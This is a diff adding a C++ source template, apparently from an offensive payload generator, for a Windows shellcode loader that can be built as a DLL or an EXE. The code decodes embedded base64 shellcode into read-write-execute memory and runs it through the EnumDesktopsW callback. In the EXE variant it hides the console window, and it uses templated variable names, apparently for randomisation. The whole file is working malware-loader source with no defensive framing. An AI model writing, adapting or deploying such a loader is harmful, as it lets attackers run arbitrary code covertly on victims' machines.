@@ -1,0 +1,99 @@
+#include <Windows.h>
+#include <iterator>
+#include <iomanip>
+#include <iostream>
+#include <vector>
+
+unsigned char shellcode[] = {
+  {{ .Shellcode }}
+};
+
+unsigned int shellcodeLen = {{ .ShellcodeLen }};
+
+// Prototypes
+std::vector<char> base64_decode(const unsigned char*, size_t);
+
+{{ if eq .Format "dll" }}
+
+BOOL WINAPI DllMain(HINSTANCE {{ index .V "hInst" }}, DWORD {{ index .V "fdwReason" }}, LPVOID {{ index .V "lpvReserved" }}) {
+if ({{ index .V "fdwReason" }} != DLL_PROCESS_ATTACH)
+  return true;
+
+{{ else if eq .Format "exe" }}
+
+int main(int {{ index .V "argc" }}, char** {{ index .V "argv" }}) {
+
+  ::ShowWindow(::GetConsoleWindow(), SW_HIDE);
+{{ end }}
+
+	std::vector<char> buffer = base64_decode(shellcode, shellcodeLen);
+	int bufferSize = buffer.size();
+
+	// LPVOID addressPointer = VirtualAlloc(NULL, bufferSize, 0x3000, 0x40);
+	// memcpy(addressPointer, &buffer[0], bufferSize);
+
+	// DWORD dummy;
+	// ::VirtualProtect(addressPointer, bufferSize, PAGE_EXECUTE_READ, &dummy);
+	// HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)addressPointer, NULL, 0, 0);
+
+	LPVOID addr = ::VirtualAlloc(NULL, bufferSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+	::RtlMoveMemory(addr, &buffer[0], bufferSize);
+
+	::EnumDesktopsW(GetProcessWindowStation(), (DESKTOPENUMPROCW)addr, NULL);
+
+  {{ if eq .Format "exe" }}
+	// WaitForSingleObject(hThread, INFINITE);
+  {{ end }}	
+
+	return true;
+}
+
+// Base64 decode
+std::vector<char> base64_decode(const unsigned char* input, size_t in_len) {
+	constexpr static unsigned char kDecodingTable[] = {
+		64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,
+		64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,
+		64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 62, 64, 64, 64, 63,
+		52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 64, 64, 64, 64, 64, 64,
+		64,  0,  1,  2,  3,  4,  5,  6,  7,  8,  9, 10, 11, 12, 13, 14,
+		15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 64, 64, 64, 64, 64,
+		64, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40,
+		41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 64, 64, 64, 64, 64,
+		64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,
+		64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,
+		64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,
+		64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,
+		64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,
+		64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,
+		64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,
+		64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64
+	};
+
+	std::string out = "";
+
+	//size_t in_len = inputSize;
+	//if (in_len % 4 != 0) return "Input data size is not a multiple of 4";
+
+	size_t out_len = in_len / 4 * 3;
+	if (input[in_len - 1] == '=') out_len--;
+	if (input[in_len - 2] == '=') out_len--;
+
+	out.resize(out_len);
+
+	for (size_t i = 0, j = 0; i < in_len;) {
+		uint32_t a = input[i] == '=' ? 0 & i++ : kDecodingTable[static_cast<int>(input[i++])];
+		uint32_t b = input[i] == '=' ? 0 & i++ : kDecodingTable[static_cast<int>(input[i++])];
+		uint32_t c = input[i] == '=' ? 0 & i++ : kDecodingTable[static_cast<int>(input[i++])];
+		uint32_t d = input[i] == '=' ? 0 & i++ : kDecodingTable[static_cast<int>(input[i++])];
+
+		uint32_t triple = (a << 3 * 6) + (b << 2 * 6) + (c << 1 * 6) + (d << 0 * 6);
+
+		if (j < out_len) out[j++] = (triple >> 2 * 8) & 0xFF;
+		if (j < out_len) out[j++] = (triple >> 1 * 8) & 0xFF;
+		if (j < out_len) out[j++] = (triple >> 0 * 8) & 0xFF;
+	}
+
+	std::vector<char> outVector(out.begin(), out.end());
+
+	return outVector;
+}
